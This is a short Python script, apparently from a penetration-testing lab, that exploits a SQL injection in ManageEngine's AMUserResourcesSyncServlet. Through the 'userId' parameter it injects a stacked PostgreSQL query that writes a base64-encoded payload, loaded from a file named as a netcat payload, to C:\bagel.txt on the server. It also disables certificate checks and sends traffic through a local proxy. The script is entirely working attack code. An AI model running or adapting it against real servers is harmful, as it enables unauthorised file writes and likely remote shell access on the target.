import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import base64
import urllib
import subprocess
import netifaces as ni



#file = open('./whoami-hex-compressed-b64.txt', 'r')
file = open('./nc-hex-compressed-b64.txt', 'r')
payload_minified = file.read()
file.close()
squote_encoder = lambda s: s.replace('\'','$$')
query = lambda payload: squote_encoder(F";copy (select convert_from(decode('{payload}','base64'),'utf-8')) to 'C:\\bagel.txt';")
proxies = {
    'http': 'http://127.0.0.1:8080/',
    'https': 'https://127.0.0.1:8080/'
}
data = {
    "ForMasRange": "1",
    "userId":F"1{query(payload_minified)}"
}
print(data)
res = requests.post("https://manageengine:8443/servlet/AMUserResourcesSyncServlet", data = data, verify=False)
print(res.status_code)
print(res.content)
